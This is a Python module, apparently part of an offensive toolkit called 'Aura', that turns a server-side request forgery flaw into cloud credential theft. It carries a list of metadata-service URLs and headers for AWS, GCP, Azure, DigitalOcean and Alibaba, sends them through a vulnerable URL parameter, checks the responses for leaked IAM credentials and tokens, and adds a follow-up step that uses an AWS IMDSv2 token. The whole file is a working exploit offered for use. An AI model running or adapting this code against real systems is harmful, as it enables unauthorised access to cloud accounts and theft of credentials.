"""
Aura v51.0 — Sentinel SSRF (Cloud Escalation Engine) ☁️🧨
========================================================
Specialized engine for pivoting from SSRF to Cloud Metadata (IMDS) exfiltration.
Supports AWS (v1 & v2), Azure, GCP, DigitalOcean, and Alibaba Cloud.
"""
import asyncio
import json
import re
import os
from typing import List, Dict, Any, Optional
from rich.console import Console
from rich.panel import Panel
import httpx
from aura.core.brain import AuraBrain

console = Console()

class SentinelSSRF:
    """
    v51.0 OMEGA: Sentinel SSRF.
    Turns simple SSRF into full cloud compromise.
    """

    METADATA_TARGETS = [
        # AWS IMDSv1
        {"name": "AWS (IMDSv1)", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "headers": {}},
        # AWS IMDSv2 (Requires Token)
        {"name": "AWS (IMDSv2 Initial)", "url": "http://169.254.169.254/latest/api/token", "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}},
        # GCP
        {"name": "GCP", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "headers": {"Metadata-Flavor": "Google"}},
        # Azure
        {"name": "Azure", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "headers": {"Metadata": "true"}},
        # DigitalOcean
        {"name": "DigitalOcean", "url": "http://169.254.169.254/metadata/v1.json", "headers": {}},
        # Alibaba
        {"name": "Alibaba", "url": "http://100.100.100.200/latest/meta-data/", "headers": {}}
    ]

    def __init__(self):
        self.brain = AuraBrain()
        self.findings = []

    async def escalate(self, vulnerable_url: str, param: str = None):
        """
        Attempts to leak cloud metadata via a confirmed SSRF endpoint.
        vulnerable_url: 'http://target.com/fetch?url='
        """
        console.print(f"[bold cyan][Sentinel SSRF] Initiating Cloud Escalation on {vulnerable_url}[/bold cyan]")
        
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for target in self.METADATA_TARGETS:
                console.print(f"[dim]  [*] Probing {target['name']}...[/dim]")
                
                # Construct payload
                # Note: This version assumes simple URL concatenation. 
                # Advanced bypasses (encoding, redirects) would be added in _generate_payloads.
                payload_url = f"{vulnerable_url}{target['url']}"
                
                try:
                    # In a real SSRF relay, we might need to pass target['headers'] 
                    # as part of the relayed request, but that depends on the SSRF sink.
                    # For IMDSv1/GCP/Azure, the headers are often required.
                    # We'll try common relay headers first.
                    relay_headers = {**target['headers'], "User-Agent": "Aura-Sentinel-SSRF/51.0"}
                    
                    resp = await client.get(payload_url, headers=relay_headers)
                    
                    if resp.status_code == 200 and len(resp.text) > 5:
                        # Validate if it's actually metadata
                        if self._is_cloud_metadata(resp.text, target['name']):
                            evidence = (
                                f"SSRF to Cloud Escalation Success!\n"
                                f"Target: {target['name']}\n"
                                f"Endpoint: {vulnerable_url}\n"
                                f"Leak: {resp.text[:500]}..."
                            )
                            console.print(Panel(evidence, title="[bold red]CRITICAL: CLOUD EXFILTRATION[/bold red]", border_style="red"))
                            self.findings.append({
                                "type": "SSRF Cloud Escalation",
                                "severity": "CRITICAL",
                                "url": vulnerable_url,
                                "cloud": target['name'],
                                "evidence": evidence
                            })
                            
                            # If it's AWS IMDSv2 Token, we'd need to use it for sub-probes
                            if "IMDSv2" in target['name']:
                                await self._probe_aws_v2_with_token(vulnerable_url, resp.text, client)
                                
                except Exception as e:
                    continue

    def _is_cloud_metadata(self, body: str, provider: str) -> bool:
        """Heuristic check for valid cloud metadata."""
        if provider == "AWS (IMDSv1)" and any(x in body for x in ["iam", "instance-id", "ami-id"]):
            return True
        if provider == "GCP" and "access_token" in body:
            return True
        if provider == "Azure" and "compute" in body:
            return True
        if provider == "DigitalOcean" and "droplet_id" in body:
            return True
        return False

    async def _probe_aws_v2_with_token(self, vulnerable_url: str, token: str, client: httpx.AsyncClient):
        """Pivots with AWS IMDSv2 token."""
        url = f"{vulnerable_url}http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        headers = {"X-aws-ec2-metadata-token": token.strip()}
        try:
            resp = await client.get(url, headers=headers)
            if resp.status_code == 200:
                console.print(f"[bold red][!!!] IMDSv2 IAM Credentials Leaked via Token![/bold red]")
                self.findings.append({
                    "type": "IMDSv2 Full Exfiltration",
                    "severity": "CRITICAL",
                    "url": vulnerable_url,
                    "evidence": resp.text
                })
        except:
            pass

if __name__ == "__main__":
    # Self-test logic
    import sys
    if len(sys.argv) > 1:
        asyncio.run(SentinelSSRF().escalate(sys.argv[1]))
